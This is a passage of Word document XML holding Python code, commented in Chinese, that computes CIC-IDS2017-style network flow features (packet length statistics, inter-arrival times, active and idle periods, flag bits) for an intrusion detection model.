        <w:t xml:space="preserve">    var = sum((v - mean) ** 2 for v in values) / n  # 总体标准差，与 CICFlowMeter 一致</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF6E25F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return mean, math.sqrt(var), max(values), min(values)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B90EFB6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01CEE813">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BF19F48">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def _bit(n: int) -&gt; float:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B40BD3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """标志位列一律输出 0/1。CIC-IDS2017 发布的 8 个 flag 列与 4 个 Fwd/Bwd Flags 列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D276CE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    取值只有 0/1（`PSH Flag Count` 也是），不是"出现过几次"。我们按出现次数输出的话，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317E9EE2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    一条 200 包的洪流会给出 200，而训练集里最大值是 1——z 分数上千，模型直接失效。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677A5B05">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return 1.0 if n &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E5D29C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08AD7AE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16F2CC3F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def _iats(ts: list) -&gt; list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3183B2FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """同一方向内相邻包的时间差（微秒）。不足两个包时为空。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A2A1C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return [(b - a) * 1e6 for a, b in zip(ts, ts[1:])]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6486A167">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="134FAFB3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DA9BCC1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def _active_idle(ts: list) -&gt; tuple:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A07229">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """把整条流按 5 s 间隔切成活跃期/空闲期，返回两组的时长列表（微秒）。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23DC7060">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not ts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A2F5A7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="471B9010">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    active, idle = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CAA3ECD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    seg_start = ts[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16843CAE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for prev, cur in zip(ts, ts[1:]):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06898534">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        gap = cur - prev</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E2DD3A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if gap &gt;= ACTIVE_TIMEOUT_S:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4BA779">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            active.append((prev - seg_start) * 1e6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F3AA3B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            idle.append(gap * 1e6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B98F3A1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            seg_start = cur</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109CB6BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    active.append((ts[-1] - seg_start) * 1e6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61AD465A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return active, idle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CCC246C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E24E2C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39BAE3D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def flow_features(flow: FlowState, now: float | None = None) -&gt; dict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="159EE3C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """算出一条流的 78 维特征。now 用于给未结束的流算截止到此刻的时长。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB71D71">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 未结束的流用当前时刻兜底：否则一个还在跑的长连接时长恒为 0，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D82CE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 速率类特征会被放大成天文数字（实测未兜底时 Flow Bytes/s 会出现 1e12 量级）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CF1E11">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    end = flow.last if flow.finished or now is None else max(now, flow.last)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7478ACBE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    all_ts = sorted(flow.fwd_ts + flow.bwd_ts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292D58F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    all_len = flow.fwd_len + flow.bwd_len</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316A673A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32ECFF51">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    duration_us = max((end - flow.start) * 1e6, 1.0)  # 除以 0 会把速率撑成 inf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1402F53F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    duration_s = duration_us / 1e6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71384DD8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    total_bytes = sum(all_len)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA03F0C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    total_pkts = len(all_len)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="272AFBD6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    n_fwd, n_bwd = len(flow.fwd_ts), len(flow.bwd_ts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EAABB1A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F646A78">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    f_mean, f_std, f_max, f_min = _stats(flow.fwd_len)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19327B4B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    b_mean, b_std, b_max, b_min = _stats(flow.bwd_len)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C804117">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    p_mean, p_std, p_max, p_min = _stats(all_len)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="046D3BA3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fi_mean, fi_std, fi_max, fi_min = _stats(_iats(flow.fwd_ts))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F100BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    bi_mean, bi_std, bi_max, bi_min = _stats(_iats(flow.bwd_ts))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718DA680">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ai_mean, ai_std, ai_max, ai_min = _stats(_iats(all_ts))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F24195">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    active_periods, idle_periods = _active_idle(all_ts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1504106B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    act_mean, act_std, act_max, act_min = _stats(active_periods)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="524ACC43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    idl_mean, idl_std, idl_max, idl_min = _stats(idle_periods)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351F806F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32F2AB37">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fwd_iats = _iats(flow.fwd_ts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37EF2D91">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    bwd_iats = _iats(flow.bwd_ts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA2EE90">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48AB624C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4757C919">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Destination Port": float(flow.key[4]),</w:t>
